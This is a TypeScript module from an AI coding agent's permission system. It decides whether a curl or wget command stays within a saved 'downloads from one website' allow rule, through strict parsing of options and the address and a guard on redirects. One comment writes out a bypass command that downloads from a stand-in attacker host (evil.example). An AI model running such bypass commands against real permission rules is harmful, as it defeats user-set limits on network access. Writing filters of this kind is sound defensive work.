// "Downloads from <website> only": the narrow Always-allow choice for a curl/wget download
// (Destin's review deck 2026-11-01, Q-6).
//
// WHY a separate rule kind (match: 'download-host') and not a glob pattern: a pattern such as
// `curl*https://github.com/*` also matches `curl https://evil.example -o x https://github.com/y`,
// because `*` crosses words. The website has to come from a PARSED address, so the engine asks
// this module "what site does this download talk to?" at decision time and compares the answer
// with the saved rule. The offer side (bash-grant-shapes) and the engine (subject-glob) both call
// the one function below, so the sentence the card shows and the rule the engine honours cannot
// disagree.
//
// WHAT it is: a speed bump, not a sandbox. Claude Code's own docs warn that address-limited rules
// are easy to get around (redirects, tricks in the address). So the module is an ALLOWLIST:
//  * only a command made of options listed below and ONE plain http(s) address passes;
//  * the address must match a strict spelling (letters, digits, dots, hyphens; no user:password@,
//    no port, no backslash, no [] {} (curl expands those into many addresses), no IP numbers,
//    no home-network names such as .local);
//  * following redirects (curl -L, wget's default) is allowed ONLY because the engine runs such a command
//    guarded (2026-11-02, review deck round 3 Q-7 "same-site"): every link hop must stay on the exact same
//    website, and a hop to another website stops the download. The verdict marks these `followsRedirects`;
//    the guard itself lives in main/harness/download-guard.ts. `--location-trusted` (sends passwords on to
//    the other website) and an explicit --max-redirect=N stay refused;
//  * anything else returns { ok: false } and the caller offers only the word-for-word choice.
// Sending data out, config files, cookies from files, writing outside the project and variables
// are already refused by riskyVariant (bash-risky-variants.ts) and are re-checked here.
import { riskyVariant } from './bash-risky-variants';

export type DownloadHostVerdict =
  // url = the one address as typed; followsRedirects = the command would follow links (so it must run guarded).
  | { ok: true; program: 'curl' | 'wget'; host: string; url: string; followsRedirects: boolean }
  // 'redirects' now means only: follows links in a way the guard cannot limit (--location-trusted, --max-redirect=N,
  // or an output spelling the guard could not re-quote safely).
  | { ok: false; reason: 'redirects' | 'unclear' };

const UNCLEAR: DownloadHostVerdict = { ok: false, reason: 'unclear' };
const REDIRECTS: DownloadHostVerdict = { ok: false, reason: 'redirects' };

function words(command: string): string[] {
  return (command.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) ?? []).map((t) => t.replace(/["'\\]/g, ''));
}

// Letters of a short-option cluster that take no value, per program. Only plain, quiet download options.
const CURL_FLAG_LETTERS = 'sSfOJIg';
const CURL_VALUE_SHORT = new Set(['-o', '-m']);
const CURL_FLAG_LONG = new Set(['--silent', '--show-error', '--fail', '--remote-name', '--remote-header-name', '--head', '--globoff', '--compressed', '--no-progress-meter']);
const CURL_VALUE_LONG = new Set(['--output', '--max-time', '--connect-timeout', '--retry']);
const WGET_FLAG = new Set(['-q', '-nv', '-c', '-N', '--quiet', '--no-verbose', '--continue', '--timestamping']);
const WGET_VALUE = new Set(['-O', '--output-document', '-T', '--timeout', '-t', '--tries']);

const NUMBER = /^\d{1,6}(\.\d{1,3})?$/;
// Home-network and private-use endings: a download from one is not "a website".
const PRIVATE_TLDS = new Set(['local', 'localhost', 'internal', 'lan', 'home', 'corp', 'intranet', 'private', 'localdomain', 'test', 'invalid', 'example']);
const LABEL = /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/;
const TLD = /^(?:[a-z]{2,63}|xn--[a-z0-9-]{1,59})$/;
// Everything after the host: path, query, fragment — and nothing that could be read two ways.
const ADDRESS = /^(https?):\/\/([A-Za-z0-9.-]+)([/?#][A-Za-z0-9._~:/?#&=+,;%!()-]*)?$/;

/** The website of a plain http(s) address, or null when anything about it is unusual. */
export function strictHostOf(word: string): string | null {
  const m = ADDRESS.exec(word);
  if (!m) return null;
  const host = m[2].toLowerCase();
  if (host.length > 253 || host.endsWith('.') || host.startsWith('.')) return null;
  const labels = host.split('.');
  if (labels.length < 2 || !labels.every((l) => LABEL.test(l))) return null;
  const tld = labels[labels.length - 1];
  // A last part with a digit in it is an IP number (127.0.0.1, 0x7f.1, 2130706433), never a website name.
  if (!TLD.test(tld) || PRIVATE_TLDS.has(tld)) return null;
  // Second opinion from the platform's own parser: it must read the same website we did.
  try {
    const u = new URL(word);
    if (u.hostname !== host || u.username !== '' || u.password !== '' || u.port !== '') return null;
  } catch { return null; }
  return host;
}

/** Hide quoted runs so operators inside quotes (an `&` in a web address) are not mistaken for shell syntax. */
function unquoted(command: string): string {
  return command.replace(/'[^']*'/g, "''").replace(/"[^"]*"/g, '""');
}

/** What website this single curl/wget download talks to, or why that cannot be said.
 *  null = not a curl/wget command at all. */
export function downloadHostVerdict(command: string): DownloadHostVerdict | null {
  const list = words(command);
  const program = list[0];
  if (program !== 'curl' && program !== 'wget') return null;
  // A second command, a redirect or a fill-in: not a plain download. (riskyVariant also refuses variables.)
  if (/[;&|<>`$\n\r(){}\\]/.test(unquoted(command))) return UNCLEAR;
  if (riskyVariant(command) !== null) return UNCLEAR;

  let address: string | null = null;
  let maxRedirectZero = false;
  let curlFollows = false;
  for (let i = 1; i < list.length; i++) {
    const t = list[i];
    if (!t.startsWith('-')) {
      if (address !== null) return UNCLEAR; // two addresses (or a stray word): not one website
      address = t;
      continue;
    }
    if (program === 'curl') {
      // --location-trusted sends the person's password on to the other website: never covered.
      if (t === '--location-trusted') return REDIRECTS;
      if (t === '--location') { curlFollows = true; continue; }
      // A short cluster such as -sSL: L means follow links; the other letters must still be plain download letters.
      if (/^-[A-Za-z]+$/.test(t) && t.slice(1).includes('L')) {
        if (![...t.slice(1)].every((ch) => ch === 'L' || CURL_FLAG_LETTERS.includes(ch))) return UNCLEAR;
        curlFollows = true;
        continue;
      }
      if (t.startsWith('--')) {
        const eq = t.indexOf('=');
        const name = eq === -1 ? t : t.slice(0, eq);
        if (CURL_FLAG_LONG.has(name) && eq === -1) continue;
        if (CURL_VALUE_LONG.has(name)) {
          const value = eq === -1 ? list[++i] : t.slice(eq + 1);
          if (value === undefined || value === '' || value.startsWith('-')) return UNCLEAR;
          if (name !== '--output' && !NUMBER.test(value)) return UNCLEAR;
          continue;
        }
        return UNCLEAR;
      }
      if (CURL_VALUE_SHORT.has(t)) {
        const value = list[++i];
        if (value === undefined || value === '' || value.startsWith('-')) return UNCLEAR;
        if (t === '-m' && !NUMBER.test(value)) return UNCLEAR;
        continue;
      }
      if (/^-[A-Za-z]+$/.test(t) && [...t.slice(1)].every((ch) => CURL_FLAG_LETTERS.includes(ch))) continue;
      return UNCLEAR;
    }
    // wget
    if (t === '--max-redirect=0') { maxRedirectZero = true; continue; }
    if (t.startsWith('--max-redirect=')) return REDIRECTS;
    if (t === '--max-redirect') {
      if (list[i + 1] !== '0') return REDIRECTS;
      maxRedirectZero = true; i++; continue;
    }
    if (WGET_FLAG.has(t)) continue;
    const eq = t.indexOf('=');
    const name = t.startsWith('--') && eq !== -1 ? t.slice(0, eq) : t;
    if (WGET_VALUE.has(name)) {
      const value = t.startsWith('--') && eq !== -1 ? t.slice(eq + 1) : list[++i];
      if (value === undefined || value === '' || value.startsWith('-')) return UNCLEAR;
      if (name !== '-O' && name !== '--output-document' && !NUMBER.test(value)) return UNCLEAR;
      continue;
    }
    return UNCLEAR;
  }
  if (address === null) return UNCLEAR;
  const host = strictHostOf(address);
  if (host === null) return UNCLEAR;
  // wget follows redirects unless told not to; curl only with -L / --location.
  const followsRedirects = program === 'wget' ? !maxRedirectZero : curlFollows;
  // A following command is re-issued by the guard with every word re-quoted, so each word must be plain enough that
  // quoting cannot change what it means (no ~ or * expansion, no spaces). Anything else stays word-for-word only.
  if (followsRedirects && !list.every((w) => w === address || SAFE_WORD.test(w))) return REDIRECTS;
  return { ok: true, program, host, url: address, followsRedirects };
}

const SAFE_WORD = /^[A-Za-z0-9._\/=,+:-]+$/;
const shq = (w: string) => `'${w.replace(/'/g, `'\\''`)}'`;

/** The same download, rewritten so it can NOT follow a link: curl loses -L / --location, wget gains --max-redirect=0,
 *  and the address becomes `finalUrl` (where the guard already walked the same-website links to). Null = not a
 *  command the guard can re-issue. WHY the guard rewrites instead of watching: this way even if the website answers
 *  differently the second time, the command that actually runs has no way to reach another website. */
export function sameSiteDownloadCommand(command: string, finalUrl: string): string | null {
  const v = downloadHostVerdict(command);
  if (!v || !v.ok || !v.followsRedirects || strictHostOf(finalUrl) !== v.host) return null;
  const list = words(command);
  const out: string[] = [];
  for (const w of list) {
    if (w === v.url) { out.push(shq(finalUrl)); continue; }
    if (v.program === 'curl') {
      if (w === '--location') continue;
      if (/^-[A-Za-z]+$/.test(w) && w.includes('L')) {
        const rest = w.replace(/L/g, '');
        if (rest !== '-') out.push(rest);
        continue;
      }
    }
    // Every other word already passed SAFE_WORD, so it needs no quoting (and quoting could only change its meaning).
    out.push(w);
    if (v.program === 'wget' && w === list[0]) out.push('--max-redirect=0');
  }
  return out.join(' ');
}

/** The saved rule's pattern: `curl github.com`. */
export function downloadHostPattern(program: 'curl' | 'wget', host: string): string {
  return `${program} ${host}`;
}

/** Does a saved `download-host` rule cover this command? The engine's one question. */
export function downloadHostRuleCovers(pattern: string | undefined, subject: string, opts: { allowFollowing?: boolean } = {}): boolean {
  if (pattern === undefined) return false;
  const v = downloadHostVerdict(subject);
  if (v === null || !v.ok || downloadHostPattern(v.program, v.host) !== pattern) return false;
  // WHY: a link-following download is covered only where the engine can run it guarded (default: yes, a whole command).
  return v.followsRedirects ? opts.allowFollowing !== false : true;
}
